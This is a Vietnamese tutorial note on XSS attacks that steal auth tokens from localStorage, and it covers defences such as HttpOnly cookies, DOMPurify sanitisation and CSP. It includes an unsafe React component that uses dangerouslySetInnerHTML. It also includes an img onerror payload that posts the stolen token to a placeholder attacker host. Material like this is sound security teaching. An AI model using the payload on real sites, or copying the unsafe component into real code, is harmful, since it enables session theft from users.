<br>

```
## Màn đăng nhập lưu vào localStorage
```
![[Màn đăng nhập lưu vào localStorage.png]]
## 1️⃣ Giới thiệu

XSS (Cross-Site Scripting) là một kiểu tấn công phổ biến, trong đó kẻ tấn công có thể chèn và thực thi mã JavaScript độc hại trên trang web của nạn nhân. Một trong những rủi ro lớn nhất của XSS là khả năng đánh cắp dữ liệu từ `localStorage` 🚨.

## 2️⃣ Ví dụ tấn công cụ thể

Giả sử một website có một form bình luận không được lọc dữ liệu (sanitize) đúng cách:

```jsx
// Component bình luận không an toàn
const Comment = ({ text }) => {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
};
```

Kẻ tấn công có thể gửi một bình luận chứa mã JavaScript độc hại như sau:

```js
<img src="x" onerror="
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({token})
  });
"/>
```

## 3️⃣ Cách thức tấn công

1. Kẻ tấn công đăng bình luận chứa mã XSS lên website.
    
2. Khi người dùng khác mở trang có bình luận này, trình duyệt sẽ thực thi đoạn mã độc.
    
3. Script lấy dữ liệu từ `localStorage`, ví dụ `auth_token`.
    
4. Token này được gửi về server của kẻ tấn công.
    
5. Kẻ tấn công có thể sử dụng token để mạo danh người dùng.
    

### 🔁 Flow tấn công

```java
Attacker  -->  Website  -->  LocalStorage  -->  Attacker Server
                     ⬇
               Script chạy
                     ⬇
           Lấy auth_token
                     ⬇
         Gửi về server attacker
                     ⬇
        Kẻ tấn công sử dụng token
```

## 4️⃣ Cách phòng tránh XSS

### ✅ Sử dụng **HttpOnly Cookies** thay vì `localStorage`

- Cookies có thuộc tính `HttpOnly` không thể bị truy xuất bằng JavaScript.
    
- Điều này ngăn chặn việc đánh cắp token thông qua XSS.
    

### ✅ **Sanitize input từ người dùng**

- Dùng thư viện như `DOMPurify` để làm sạch dữ liệu đầu vào.
    

```jsx
import DOMPurify from 'dompurify';
const sanitizedText = DOMPurify.sanitize(userInput);
```

### ✅ **Implement CSP (Content Security Policy)**

- Hạn chế script không đáng tin cậy bằng CSP header:
    

```js
Content-Security-Policy: default-src 'self'; script-src 'self';
```

### ✅ **Validate và encode output**

- Dùng `textContent` thay vì `innerHTML`:
    

```js
document.getElementById('comment').textContent = userInput;
```

### ✅ **Sử dụng CSRF Token**

- Ngăn chặn kẻ tấn công thực hiện yêu cầu trái phép với CSRF token.
    

## 5️⃣ Kết luận

XSS là một lỗ hổng nguy hiểm có thể dẫn đến đánh cắp thông tin quan trọng như `auth_token`. Việc sử dụng các biện pháp phòng tránh trên là **bắt buộc** để bảo vệ người dùng.

Bạn muốn tìm hiểu thêm về cách implement các biện pháp bảo vệ không? 🚀

```
## Màn tấn công vào localStorage
```

![[Màn tấn công vào localStorage.png]]
